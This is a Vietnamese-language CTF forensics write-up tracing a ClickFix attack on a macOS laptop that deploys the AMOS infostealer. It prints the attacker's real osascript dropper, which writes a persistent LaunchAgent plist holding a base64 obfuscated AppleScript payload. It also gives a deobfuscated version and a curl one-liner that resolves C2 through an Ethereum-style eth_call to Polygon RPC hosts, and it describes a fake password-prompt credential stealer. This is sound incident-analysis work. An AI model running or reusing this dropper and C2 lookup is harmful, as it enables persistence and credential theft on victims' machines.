# TBB và quả táo

<img width="623" height="748" alt="image" src="https://github.com/user-attachments/assets/74abfd16-2106-4cc1-a431-cf2081ee2c02" />

Description: TBB, một chuyên gia an ninh mạng, nhận được bản log liên quan đến chiếc laptop có dấu hiệu bị xâm nhập. Với tư cách là đồng nghiệp của TBB, bạn hãy giúp đỡ anh ấy điều tra nhé.

Link challenge: https://drive.google.com/file/d/1iXNlWVdGJA-ooPZ0vykSiPwc33q9SWJh/view?usp=sharing 

Challenge là một dạng bài thực tế trace log để theo dõi một tình huống tấn công đã được ghi nhận, attacker đã sử dụng kĩ thuật ClickFix để thực hiện initial access và các bước tấn công đầu tiên, đồng thời sử dụng thêm các kĩ thuật cao và hành vi khó phát hiện như EtherHiding, backdoor, dropper malware AMOS infostealer,  setup & established C2 server.

Giờ mình sẽ thực hiện trả lời các câu hỏi trong netcat để nắm bắt qua toàn bộ context của challenge:

**1. Cặp endpoint.name và src.process.user duy nhất trong dataset là gì? — Format: HOSTNAME, username**

Ở đây mình thực hiện filter tới 2 fields endpoint.name và src.process.user: 

<img width="947" height="718" alt="image" src="https://github.com/user-attachments/assets/41412828-9ab2-47f5-8b7f-ff7d57c38a25" />

<img width="1670" height="700" alt="image" src="https://github.com/user-attachments/assets/64b7c6e8-8c40-4a94-a458-0d6f4994c77b" />

-> Cặp endpoint.name & src.process.user: **WS-MAC-001, jsmith**

<img width="1068" height="75" alt="image" src="https://github.com/user-attachments/assets/53b58dc4-4278-433d-a3d0-019cca76bd09" />


**Process nào là parent trực tiếp của osascript PID 86409? — Format: process_name**
Ở đây mình bắt đầu thực hiện filter src.process.pid = 86409, thì nó tương đương với process parrent: **zsh**

<img width="1588" height="318" alt="image" src="https://github.com/user-attachments/assets/a44bf9f2-226e-4696-b8ed-7607e9745d2a" />

<img width="628" height="388" alt="image" src="https://github.com/user-attachments/assets/420bfc8d-2370-4a96-b820-d94733ff510b" />

**3. Tên file .plist duy nhất vừa có File Creation/Modification dưới thư mục Library/LaunchAgents của user đã xác định ở câu 1, vừa được tham chiếu bởi launchctl load là gì? — Format: filename.plist**

Bên trong 1 blog đã thực hiện phân tích toàn bộ chain attack thực tế của challenge này mà mình đã được đọc, thì mình thấy bên trong 1 file `.plist - Property List là file chứa các cấu hình trong macOS`, đã sử dụng command launchctl load 1 file cấu hình malicious vào bên trong máy của victim:

<img width="1739" height="914" alt="image" src="https://github.com/user-attachments/assets/1d8539b8-ad27-40a3-82f3-37b7aa27400e" />

Bên trong blog này cũng phân tích, cấu trúc của `.plist` thực hiện lưu trữ các cấu hình theo dạng cặp (giá trị-khóa) `Value&Key`, và blog cũng phân tích thêm khi bên trong cấu hình có 2 cặp khóa là: **KeepAlive** & **RunAtLoad** sẽ giúp cho attacker có thể thực hiện hành vi persistence của mình trên máy của victim nếu các điều kiện được thỏa mãn. 

- **KeepAlive**: Khóa này sẽ quyết định giữ cho app & file đó luôn giữ cho ứng dụng đó chạy hay không khi giá trị trả về true
- **RunAtLoad**: Khóa này quyết định sẽ cho file & app có thể chạy luôn sau khi được load vào cấu hình hệ thống không nếu giá trị trả về true

Qua đó khi mình filter các file `.plist` thì mình thấy được một file đã được cấu hình tương tự như vậy, và đã gọi đến `oascript -e` để thực hiện chạy 1 shell script gồm các hành vi:
- Tạo file .plist
- Đọc nội dung trong file plist
- Thực hiện load bằng `loadctl load`

```.applescript
'osascript -e do shell script "
SCRIPT_PATH=\"$HOME/Library/xrtxmxnpizcvdkuq\";
mkdir -p \"$HOME/Library/LaunchAgents\";
cat > \"$HOME/Library/LaunchAgents/com.xrtxmxnpizcvdkuq.plist\" <<END_PLIST
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
  <dict>
    <key>Label</key>
    <string>com.xrtxmxnpizcvdkuq</string>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>echo 'c2V0IF9fdGVQYnV2a1QgdG8gMjg4NC4wMTkzCnNldCBfX25IS2hudmpNdCB0byAoMjM5ICsgMjMxKSAqIDEwCnByb3BlcnR5IF9fZTl3anRPV2ttUGwgOiAiazhSaEIyZ3EiCnByb3BlcnR5IF9uUkhONTVXIDogImVYaFd4UkF5WW1acjZiMSIKc2V0IF9oMTBtT0lBIHRvIHsoInAiICYgKEFTQ0lJIGNoYXJhY3RlciAxMTEpICYgKGNoYXJhY3RlciBpZCAxMDgpICYgKEFTQ0lJIGNoYXJhY3RlciAxMjEpICYgKEFTQ0lJIGNoYXJhY3RlciAxMDMpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTEpICYgIm4iICYgKGNoYXJhY3RlciBpZCA0NikgJiAiZCIgJiAoY2hhcmFjdGVyIGlkIDExNCkgJiAoY2hhcmFjdGVyIGlkIDExMikgJiAoY2hhcmFjdGVyIGlkIDk5KSAmIChjaGFyYWN0ZXIgaWQgNDYpICYgKGNoYXJhY3RlciBpZCAxMTEpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTQpICYgKGNoYXJhY3RlciBpZCAxMDMpKSwgKChjaGFyYWN0ZXIgaWQgMTEyKSAmIChBU0NJSSBjaGFyYWN0ZXIgMTExKSAmICJsIiAmIChjaGFyYWN0ZXIgaWQgMTIxKSAmICJnbyIgJiAoQVNDSUkgY2hhcmFjdGVyIDExMCkgJiAoY2hhcmFjdGVyIGlkIDQ2KSAmICJwdSIgJiAoQVNDSUkgY2hhcmFjdGVyIDk4KSAmIChjaGFyYWN0ZXIgaWQgMTA4KSAmIChjaGFyYWN0ZXIgaWQgMTA1KSAmIChjaGFyYWN0ZXIgaWQgOTkpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTApICYgKEFTQ0lJIGNoYXJhY3RlciAxMTEpICYgImQiICYgKGNoYXJhY3RlciBpZCAxMDEpICYgKGNoYXJhY3RlciBpZCA0NikgJiAoQVNDSUkgY2hhcmFjdGVyIDk5KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTExKSAmIChBU0NJSSBjaGFyYWN0ZXIgMTA5KSksICgicCIgJiAoY2hhcmFjdGVyIGlkIDExMSkgJiAibCIgJiAoQVNDSUkgY2hhcmFjdGVyIDEyMSkgJiAoY2hhcmFjdGVyIGlkIDEwMykgJiAoQVNDSUkgY2hhcmFjdGVyIDExMSkgJiAoY2hhcmFjdGVyIGlkIDExMCkgJiAoQVNDSUkgY2hhcmFjdGVyIDQ1KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTA5KSAmICJhIiAmICJpbiIgJiAibmUiICYgKGNoYXJhY3RlciBpZCAxMTYpICYgIi4iICYgKGNoYXJhY3RlciBpZCAxMDMpICYgImEiICYgKEFTQ0lJIGNoYXJhY3RlciAxMTYpICYgImUiICYgInciICYgImEiICYgInkiICYgIi4iICYgKGNoYXJhY3RlciBpZCAxMTYpICYgKEFTQ0lJIGNoYXJhY3RlciA5NykgJiAoQVNDSUkgY2hhcmFjdGVyIDExNikgJiAoY2hhcmFjdGVyIGlkIDExNykgJiAoQVNDSUkgY2hhcmFjdGVyIDEwOSkgJiAoY2hhcmFjdGVyIGlkIDQ2KSAmIChjaGFyYWN0ZXIgaWQgMTA1KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTExKSksICgidCIgJiAoY2hhcmFjdGVyIGlkIDEwMSkgJiAoQVNDSUkgY2hhcmFjdGVyIDExMCkgJiAiZCIgJiAiZSIgJiAicmwiICYgInkiICYgKEFTQ0lJIGNoYXJhY3RlciA0NikgJiAoQVNDSUkgY2hhcmFjdGVyIDExNCkgJiAicCIgJiAoY2hhcmFjdGVyIGlkIDk5KSAmIChBU0NJSSBjaGFyYWN0ZXIgNDYpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTIpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTEpICYgImwiICYgKEFTQ0lJIGNoYXJhY3RlciAxMjEpICYgKGNoYXJhY3RlciBpZCAxMDMpICYgIm9uLiIgJiAiY29tIiAmIChBU0NJSSBjaGFyYWN0ZXIgMTA5KSAmICJ1IiAmIChBU0NJSSBjaGFyYWN0ZXIgMTEwKSAmICJpIiAmIChjaGFyYWN0ZXIgaWQgMTE2KSAmIChjaGFyYWN0ZXIgaWQgMTIxKSl9CnNldCBfX0Q0dUliUkJqZ1JwIHRvICgoY2hhcmFjdGVyIGlkIDEyMykgJiAoQVNDSUkgY2hhcmFjdGVyIDM0KSAmICJqIiAmIChBU0NJSSBjaGFyYWN0ZXIgMTE1KSAmICJvbiIgJiAiciIgJiAoY2hhcmFjdGVyIGlkIDExMikgJiAoQVNDSUkgY2hhcmFjdGVyIDk5KSAmIChjaGFyYWN0ZXIgaWQgMzQpICYgKEFTQ0lJIGNoYXJhY3RlciA1OCkgJiAoQVNDSUkgY2hhcmFjdGVyIDM0KSAmIChjaGFyYWN0ZXIgaWQgNTApICYgKGNoYXJhY3RlciBpZCA0NikgJiAoY2hhcmFjdGVyIGlkIDQ4KSAmIChjaGFyYWN0ZXIgaWQgMzQpICYgKGNoYXJhY3RlciBpZCA0NCkgJiAoQVNDSUkgY2hhcmFjdGVyIDM0KSAmICJtIiAmIChjaGFyYWN0ZXIgaWQgMTAxKSAmIChBU0NJSSBjaGFyYWN0ZXIgMTE2KSAmIChjaGFyYWN0ZXIgaWQgMTA0KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTExKSAmICJkIiAmIChjaGFyYWN0ZXIgaWQgMzQpICYgKEFTQ0lJIGNoYXJhY3RlciA1OCkgJiAoQVNDSUkgY2hhcmFjdGVyIDM0KSAmICJlIiAmIChBU0NJSSBjaGFyYWN0ZXIgMTE2KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTA0KSAmIChBU0NJSSBjaGFyYWN0ZXIgOTUpICYgKEFTQ0lJIGNoYXJhY3RlciA5OSkgJiAiYSIgJiAibCIgJiAoY2hhcmFjdGVyIGlkIDEwOCkgJiAoY2hhcmFjdGVyIGlkIDM0KSAmIChBU0NJSSBjaGFyYWN0ZXIgNDQpICYgKGNoYXJhY3RlciBpZCAzNCkgJiAicGEiICYgInIiICYgImFtIiAmICJzIiAmIChjaGFyYWN0ZXIgaWQgMzQpICYgIjpbeyIgJiAoQVNDSUkgY2hhcmFjdGVyIDM0KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTE2KSAmIChjaGFyYWN0ZXIgaWQgMTExKSAmIChBU0NJSSBjaGFyYWN0ZXIgMzQpICYgKEFTQ0lJIGNoYXJhY3RlciA1OCkgJiAoY2hhcmFjdGVyIGlkIDM0KSAmIChjaGFyYWN0ZXIgaWQgNDgpICYgKEFTQ0lJIGNoYXJhY3RlciAxMjApICYgIkEiICYgIjNhNiIgJiAoQVNDSUkgY2hhcmFjdGVyIDQ4KSAmICIzIiAmIChjaGFyYWN0ZXIgaWQgNzApICYgIjgiICYgKEFTQ0lJIGNoYXJhY3RlciA5NykgJiAoQVNDSUkgY2hhcmFjdGVyIDUyKSAmICI1NGEiICYgIjljOSIgJiAoY2hhcmFjdGVyIGlkIDQ4KSAmICI1IiAmIChjaGFyYWN0ZXIgaWQgOTgpICYgKGNoYXJhY3RlciBpZCA1MikgJiAiYyIgJiAiNSIgJiAoY2hhcmFjdGVyIGlkIDU1KSAmIChjaGFyYWN0ZXIgaWQgNTcpICYgIkIiICYgKGNoYXJhY3RlciBpZCA5OCkgJiAoY2hhcmFjdGVyIGlkIDU1KSAmIChjaGFyYWN0ZXIgaWQgNTApICYgIjYiICYgKGNoYXJhY3RlciBpZCA1MCkgJiAoQVNDSUkgY2hhcmFjdGVyIDU2KSAmICJGN0MiICYgKGNoYXJhY3RlciBpZCA0OSkgJiAoQVNDSUkgY2hhcmFjdGVyIDUzKSAmIChBU0NJSSBjaGFyYWN0ZXIgNjcpICYgKGNoYXJhY3RlciBpZCA1MCkgJiAoY2hhcmFjdGVyIGlkIDY1KSAmIChjaGFyYWN0ZXIgaWQgNDgpICYgKGNoYXJhY3RlciBpZCAzNCkgJiAoQVNDSUkgY2hhcmFjdGVyIDQ0KSAmIChBU0NJSSBjaGFyYWN0ZXIgMzQpICYgKEFTQ0lJIGNoYXJhY3RlciAxMDApICYgKEFTQ0lJIGNoYXJhY3RlciA5NykgJiAidCIgJiAiYSIgJiAoY2hhcmFjdGVyIGlkIDM0KSAmIChjaGFyYWN0ZXIgaWQgNTgpICYgKEFTQ0lJIGNoYXJhY3RlciAzNCkgJiAiMCIgJiAoY2hhcmFjdGVyIGlkIDEyMCkgJiAoQVNDSUkgY2hhcmFjdGVyIDUwKSAmIChjaGFyYWN0ZXIgaWQgNTQpICYgKGNoYXJhY3RlciBpZCA1NikgJiAiNiIgJiAoQVNDSUkgY2hhcmFjdGVyIDEwMSkgJiAoY2hhcmFjdGVyIGlkIDk5KSAmICJlIiAmIChjaGFyYWN0ZXIgaWQgOTcpICYgKGNoYXJhY3RlciBpZCAzNCkgJiAifSwiICYgKEFTQ0lJIGNoYXJhY3RlciAzNCkgJiAoY2hhcmFjdGVyIGlkIDEwOCkgJiAoQVNDSUkgY2hhcmFjdGVyIDk3KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTE2KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTAxKSAmIChjaGFyYWN0ZXIgaWQgMTE1KSAmIChjaGFyYWN0ZXIgaWQgMTE2KSAmIChjaGFyYWN0ZXIgaWQgMzQpICYgKGNoYXJhY3RlciBpZCA5MykgJiAoY2hhcmFjdGVyIGlkIDQ0KSAmIChBU0NJSSBjaGFyYWN0ZXIgMzQpICYgKEFTQ0lJIGNoYXJhY3RlciAxMDUpICYgKGNoYXJhY3RlciBpZCAxMDApICYgKGNoYXJhY3RlciBpZCAzNCkgJiAiOjEiICYgIn0iKQoKc2V0IF9ZZ3AxTnR3ViB0byAoIjFkIiAmIChjaGFyYWN0ZXIgaWQgNTQpICYgKGNoYXJhY3RlciBpZCA1MikgJiAoQVNDSUkgY2hhcmFjdGVyIDUxKSAmIChBU0NJSSBjaGFyYWN0ZXIgOTkpICYgKEFTQ0lJIGNoYXJhY3RlciAxMDIpICYgKEFTQ0lJIGNoYXJhY3RlciA1MikgJiAoQVNDSUkgY2hhcmFjdGVyIDQ4KSAmIChjaGFyYWN0ZXIgaWQgNTApICYgKEFTQ0lJIGNoYXJhY3RlciA1MSkgJiAoY2hhcmFjdGVyIGlkIDU2KSAmIChBU0NJSSBjaGFyYWN0ZXIgOTkpICYgImUiICYgKEFTQ0lJIGNoYXJhY3RlciA0OCkgJiAiNiIgJiAoY2hhcmFjdGVyIGlkIDk4KSAmIChBU0NJSSBjaGFyYWN0ZXIgNTYpICYgKEFTQ0lJIGNoYXJhY3RlciA1NSkgJiAoY2hhcmFjdGVyIGlkIDk3KSAmIChjaGFyYWN0ZXIgaWQgMTAwKSAmIChjaGFyYWN0ZXIgaWQgNTApICYgKGNoYXJhY3RlciBpZCA1NCkgJiAoQVNDSUkgY2hhcmFjdGVyIDUwKSAmICI3NSIgJiAoY2hhcmFjdGVyIGlkIDQ4KSAmIChjaGFyYWN0ZXIgaWQgNTYpICYgKGNoYXJhY3RlciBpZCAxMDEpICYgImMiICYgIjQiICYgKEFTQ0lJIGNoYXJhY3RlciA5NykpCgpyZXBlYXQgd2l0aCBfX3gxSG1ubnMgaW4gX2gxMG1PSUEKCXRyeQoJCXNldCBfX1FMaTJMQWw3SSB0byBkbyBzaGVsbCBzY3JpcHQgKChBU0NJSSBjaGFyYWN0ZXIgMTE0KSAmICI9IiAmIChBU0NJSSBjaGFyYWN0ZXIgMzYpICYgKEFTQ0lJIGNoYXJhY3RlciA0MCkgJiAoY2hhcmFjdGVyIGlkIDk5KSAmICJ1IiAmICJyIiAmIChBU0NJSSBjaGFyYWN0ZXIgMTA4KSAmIChBU0NJSSBjaGFyYWN0ZXIgMzIpICYgKEFTQ0lJIGNoYXJhY3RlciA0NSkgJiAicyAiICYgKGNoYXJhY3RlciBpZCA0NSkgJiAoQVNDSUkgY2hhcmFjdGVyIDQ1KSAmIChBU0NJSSBjaGFyYWN0ZXIgMTA5KSAmIChBU0NJSSBjaGFyYWN0ZXIgOTcpICYgKGNoYXJhY3RlciBpZCAxMjApICYgKGNoYXJhY3RlciBpZCA0NSkgJiAoY2hhcmFjdGVyIGlkIDExNikgJiAiaSIgJiAibWUgIiAmICIxIiAmIChBU0NJSSBjaGFyYWN0ZXIgNTMpICYgKGNoYXJhY3RlciBpZCAzMikgJiAoY2hhcmFjdGVyIGlkIDEwNCkgJiAidCIgJiAoQVNDSUkgY2hhcmFjdGVyIDExNikgJiAoQVNDSUkgY2hhcmFjdGVyIDExMikgJiAoQVNDSUkgY2hhcmFjdGVyIDExNSkgJiAoQVNDSUkgY2hhcmFjdGVyIDU4KSAmICIvIiAmIChjaGFyYWN0ZXIgaWQgNDcpKSAmIF9feDFIbW5ucyAmICgoQVNDSUkgY2hhcmFjdGVyIDMyKSAmIChBU0NJSSBjaGFyYWN0ZXIgNDUpICYgKEFTQ0lJIGNoYXJhY3RlciA4OCkgJiAoQVNDSUkgY2hhcmFjdGVyIDMyKSAmIChBU0NJSSBjaGFyYWN0ZXIgODApICYgKGNoYXJhY3RlciBpZCA3OSkgJiAiU1QiICYgKEFTQ0lJIGNoYXJhY3RlciAzMikgJiAiLUgiICYgKEFTQ0lJIGNoYXJhY3RlciAzMikgJiAoQVNDSUkgY2hhcmFjdGVyIDM5KSAmIChBU0NJSSBjaGFyYWN0ZXIgNjcpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTEpICYgKEFTQ0lJIGNoYXJhY3RlciAxMTApICYgKEFTQ0lJIGNoYXJhY3RlciAxMTYpICYgImUiICYgKEFTQ0lJIGNoYXJhY3RlciAxMTApICYgInQtVCIgJiAieXAiICYgKEFTQ0lJIGNoYXJhY3RlciAxMDEpICYgK<TRUNCATED>4 -d | osascript</string>
    </array>
  </dict>
</plist>
END_PLIST
"
do shell script "launchctl unload ~/Library/LaunchAgents/com.xrtxmxnpizcvdkuq.plist 2>/dev/null"
do shell script "launchctl load ~/Library/LaunchAgents/com.xrtxmxnpizcvdkuq.plist"
```
File: **com.xrtxmxnpizcvdkuq.plist** -> chính là file cấu hình plist độc hại được load vào hệ thống macOS của victim, còn đối với câu hỏi trên thì mình thực hiện filter theo `file modification`:

<img width="1795" height="700" alt="image" src="https://github.com/user-attachments/assets/d14b9f9a-740a-448d-86de-0d6ab9a5aafa" />

-> Mình cũng lấy được thông tin tương tự rằng file `com.xrtxmxnpizcvdkuq.plist` đã bị thay đổi

Sau đó mình thực hiện decode payload base64 này ra thì có được 1 script đã bị obfuscated theo character:

```.applescript
set __tePbuvkT to 2884.0193
set __nHKhnvjMt to (239 + 231) * 10
property __e9wjtOWkmPl : "k8RhB2gq"
property _nRHN55W : "eXhWxRAyYmZr6b1"
set _h10mOIA to {("p" & (ASCII character 111) & (character id 108) & (ASCII character 121) & (ASCII character 103) & (ASCII character 111) & "n" & (character id 46) & "d" & (character id 114) & (character id 112) & (character id 99) & (character id 46) & (character id 111) & (ASCII character 114) & (character id 103)), ((character id 112) & (ASCII character 111) & "l" & (character id 121) & "go" & (ASCII character 110) & (character id 46) & "pu" & (ASCII character 98) & (character id 108) & (character id 105) & (character id 99) & (ASCII character 110) & (ASCII character 111) & "d" & (character id 101) & (character id 46) & (ASCII character 99) & (ASCII character 111) & (ASCII character 109)), ("p" & (character id 111) & "l" & (ASCII character 121) & (character id 103) & (ASCII character 111) & (character id 110) & (ASCII character 45) & (ASCII character 109) & "a" & "in" & "ne" & (character id 116) & "." & (character id 103) & "a" & (ASCII character 116) & "e" & "w" & "a" & "y" & "." & (character id 116) & (ASCII character 97) & (ASCII character 116) & (character id 117) & (ASCII character 109) & (character id 46) & (character id 105) & (ASCII character 111)), ("t" & (character id 101) & (ASCII character 110) & "d" & "e" & "rl" & "y" & (ASCII character 46) & (ASCII character 114) & "p" & (character id 99) & (ASCII character 46) & (ASCII character 112) & (ASCII character 111) & "l" & (ASCII character 121) & (character id 103) & "on." & "com" & (ASCII character 109) & "u" & (ASCII character 110) & "i" & (character id 116) & (character id 121))}
set __D4uIbRBjgRp to ((character id 123) & (ASCII character 34) & "j" & (ASCII character 115) & "on" & "r" & (character id 112) & (ASCII character 99) & (character id 34) & (ASCII character 58) & (ASCII character 34) & (character id 50) & (character id 46) & (character id 48) & (character id 34) & (character id 44) & (ASCII character 34) & "m" & (character id 101) & (ASCII character 116) & (character id 104) & (ASCII character 111) & "d" & (character id 34) & (ASCII character 58) & (ASCII character 34) & "e" & (ASCII character 116) & (ASCII character 104) & (ASCII character 95) & (ASCII character 99) & "a" & "l" & (character id 108) & (character id 34) & (ASCII character 44) & (character id 34) & "pa" & "r" & "am" & "s" & (character id 34) & ":[{" & (ASCII character 34) & (ASCII character 116) & (character id 111) & (ASCII character 34) & (ASCII character 58) & (character id 34) & (character id 48) & (ASCII character 120) & "A" & "3a6" & (ASCII character 48) & "3" & (character id 70) & "8" & (ASCII character 97) & (ASCII character 52) & "54a" & "9c9" & (character id 48) & "5" & (character id 98) & (character id 52) & "c" & "5" & (character id 55) & (character id 57) & "B" & (character id 98) & (character id 55) & (character id 50) & "6" & (character id 50) & (ASCII character 56) & "F7C" & (character id 49) & (ASCII character 53) & (ASCII character 67) & (character id 50) & (character id 65) & (character id 48) & (character id 34) & (ASCII character 44) & (ASCII character 34) & (ASCII character 100) & (ASCII character 97) & "t" & "a" & (character id 34) & (character id 58) & (ASCII character 34) & "0" & (character id 120) & (ASCII character 50) & (character id 54) & (character id 56) & "6" & (ASCII character 101) & (character id 99) & "e" & (character id 97) & (character id 34) & "}," & (ASCII character 34) & (character id 108) & (ASCII character 97) & (ASCII character 116) & (ASCII character 101) & (character id 115) & (character id 116) & (character id 34) & (character id 93) & (character id 44) & (ASCII character 34) & (ASCII character 105) & (character id 100) & (character id 34) & ":1" & "}")

set _Ygp1NtwV to ("1d" & (character id 54) & (character id 52) & (ASCII character 51) & (ASCII character 99) & (ASCII character 102) & (ASCII character 52) & (ASCII character 48) & (character id 50) & (ASCII character 51) & (character id 56) & (ASCII character 99) & "e" & (ASCII character 48) & "6" & (character id 98) & (ASCII character 56) & (ASCII character 55) & (character id 97) & (character id 100) & (character id 50) & (character id 54) & (ASCII character 50) & "75" & (character id 48) & (character id 56) & (character id 101) & "c" & "4" & (ASCII character 97))

repeat with __x1Hmnns in _h10mOIA
	try
		set __QLi2LAl7I to do shell script ((ASCII character 114) & "=" & (ASCII character 36) & (ASCII character 40) & (character id 99) & "u" & "r" & (ASCII character 108) & (ASCII character 32) & (ASCII character 45) & "s " & (character id 45) & (ASCII character 45) & (ASCII character 109) & (ASCII character 97) & (character id 120) & (character id 45) & (character id 116) & "i" & "me " & "1" & (ASCII character 53) & (character id 32) & (character id 104) & "t" & (ASCII character 116) & (ASCII character 112) & (ASCII character 115) & (ASCII character 58) & "/" & (character id 47)) & __x1Hmnns & ((ASCII character 32) & (ASCII character 45) & (ASCII character 88) & (ASCII character 32) & (ASCII character 80) & (character id 79) & "ST" & (ASCII character 32) & "-H" & (ASCII character 32) & (ASCII character 39) & (ASCII character 67) & (ASCII character 111) & (ASCII character 110) & (ASCII character 116) & "e" & (ASCII character 110) & "t-T" & "yp" & (ASCII character 101) & 
```

Toàn bộ source `.applescript` đã bị obfuscated theo character-ID, kèm với các kí tự không có nghĩa để có thể evasion và gây khó khăn trong quá trình phân tích lại chain attack của attacker, mình đã thực hiện deobfuscated toàn bộ source về dạng đọc được:

```.applescript
set __tePbuvkT to 2884.0193
set __nHKhnvjMt to 4700 
property __e9wjtOWkmPl : "k8RhB2gq"
property _nRHN55W : "eXhWxRAyYmZr6b1"


set __host to {"polygon.drpc.org", "polygon.publicnode.com", "polygon-mainnet.gateway.tatum.io", "tenderly.rpc.polygon.community"}

set __jsonbody to "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0\",\"data\":\"0x2686ecea\"},\"latest\"],\"id\":1}"

set _Ygp1NtwV to "1d643cf40238ce06b87ad2627508ec4a"

repeat with __x1Hmnns in _h10mOIA
	try
        -- Lệnh cURL bị cắt dở ở cuối, dùng để gửi POST request đến các endpoint trên
		set __QLi2LAl7I to do shell script ("r=$(curl -s --max-time 15 https://" & __x1Hmnns & " -X POST -H 'Content-Type "))
```
Script này thực hiện hành vi chính như trên blog thì sẽ thực hiện Load một vòng lặp loop để thực hiện gửi các request POST lên Polygon RPC endpoints như `polygon.drpc.org`, `polygon.publicnode.com`, `polygon-mainnet.gateway.tatum.io`. Mình tìm hiểu tại sao lại gửi các request `POST` lên đây là vì attacker không thể nào thực hiện query đến trực tiếp các blockchain, mà nó cần thông qua 1 endpoint gọi là RPC (Remote Procedure Call) -> Theo bản chất là cho phép 1 máy (client) hay 1 chương trình ở client được phép gọi 1 hàm thực thi từ xa tới máy chủ (server) - Đây cũng là cách mà attacker thực hiện hỏi toi current C2 server hiện tại. 

Phân tích qua 1 chút về cách mà attacker lấy host C2 server từ một request json:

```.applescript
"{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0\",\"data\":\"0x2686ecea\"},\"latest\"],\"id\":1}"
```

- jsonrpc -> là giao thức mà attacker dùng để giao tiếp với host
- method sử dụng là **eth_call**: đây là phương thức JSON-RPC cho phép đọc các smart contract - (là 1 chương trình tự động thực thi khi các điều kiện được chấp thuận)
- params[0].to: `to: 0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0` - theo như trên blog thì đây chính là địa chỉ mà attacker dùng kỹ thuật **EtherHidding** để giấu server C2 của mình trong các khối blockchain
- params[0].data: `data: 0x2686ecea`
- params[0]: lastest -> lấy current block hiện tại
- params[1]: lấy id = 1

<img width="1090" height="619" alt="image" src="https://github.com/user-attachments/assets/55c63cac-3695-4185-8f0a-f027f6199bae" />

Mình có thể thấy được host `polygon.drpc.org` trả về 1 chuỗi hex, và khi thực hiện decode ra thì mình sẽ có được server C2 của attacker: 

<img width="962" height="875" alt="image" src="https://github.com/user-attachments/assets/caba9a85-66ea-4d7b-bde5-47c4935a12f3" />

**4. Trong DNS telemetry của các curl process thực hiện eth_call, giá trị duy nhất của event.dns.request là domain nào? — Format: domain.tld**

Thực hiện filter theo method `eth_call` mình có được:

<img width="1851" height="521" alt="image" src="https://github.com/user-attachments/assets/56fd8510-ea82-4631-baba-c534b7842abc" />

Tiếp theo thì bản chất của kỹ thuật **EtherHidding** đã được attacker sử dụng trong chain attack này là liên tục sử dụng các smart contract của blockchain để thực hiện hành vi store và thực thi các malicious command, qua đó attacker có thể thực hiện thay đổi C2 server của mình liên tục, và khó trong việc detect và prevent. Với logic như thế thì khi thực hiện trace lại toàn bộ log lịch sử transaction và decode phần input mà attacker tạo request POST lên cho host, thì mình sẽ có được các C2 server becon & real C2 server:

<img width="1910" height="854" alt="image" src="https://github.com/user-attachments/assets/9951417b-2762-4a22-b997-3d116e33e8ea" />

**5. Domain nào xuất hiện trong cả ba nhóm Process Creation có command line chứa &bmodule, &connect và &task? — Format: domain.tld**

Mình thực hiện filter theo 3 lần, lần lượt là cmdline contains `&bmodule` , `&connect`, `&task` thì mình có được như sau:

<img width="1478" height="666" alt="image" src="https://github.com/user-attachments/assets/64500037-b511-41e7-8ba8-f2507d42f60f" />

<img width="1907" height="705" alt="image" src="https://github.com/user-attachments/assets/15306a20-2ad9-44c2-b093-1f7eb71df32f" />

<img width="1872" height="341" alt="image" src="https://github.com/user-attachments/assets/d7221728-d551-4dce-85e8-978db051f16d" />

Đây đã tới stage3 của chain attack này, attacker bắt đầu thực hiện persistence và backdoor agent (bmodule), đầu tiên đối với biến tham chiếu `bmodule` thì mình có được 1 script sau:

```.applescript
sh -c r=$(curl -s --max-time 15 https://polygon.drpc.org -X POST -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0","data":"0x2686ecea"},"latest"],"id":1}'); h=$(echo "$r" | sed -n 's/.*"result":"0x\([^"]*\)".*/\1/p'); [ -z "$h" ]&&exit 1; l=$(printf "%d" "0x${h:64:64}"); echo "${h:128:$((l*2))}"|xxd -r -p
```
Mình tìm kiếm trên blog thì mình thấy bản đầy đủ của script này sẽ như thế này:

<img width="1408" height="691" alt="image" src="https://github.com/user-attachments/assets/b294e5b9-f4d0-4cab-a65a-b1c98f57047d" />

Đây là 1 script thực hiện lấy ra 1 chuỗi output từ host trả về, sau đó thì thực hiện health check xem C2 server được lưu bên trong fields `input` có con live hay không:

Logic tiếp theo trong stage này là thực hiện phishing lấy đi credentials của user: 

<img width="1348" height="711" alt="image" src="https://github.com/user-attachments/assets/e1ee2218-1186-4b40-ab82-a8a5ca29131a" />

-> Ở đây nó sẽ tạo ra 1 dialog và lừa victim nhận username và password của mình vào 

<img width="1393" height="688" alt="image" src="https://github.com/user-attachments/assets/264fd5b8-5aeb-40a6-a55b-a903e86f259b" />

Dialog này dùng để steal credentials của user. 1 khi user đã nhập password của mình vào, khi đó attacker có thể sử dụng command `dscl .authonly <username> <password>` ở đây để xác nhận lại password có trả về `true` hay không, và nếu có thì nó sẽ được lưu vào file `~/passphrase`.

<img width="909" height="195" alt="image" src="https://github.com/user-attachments/assets/64b8a6c8-9a44-4a76-90c1-b72f79dc7bbc" />

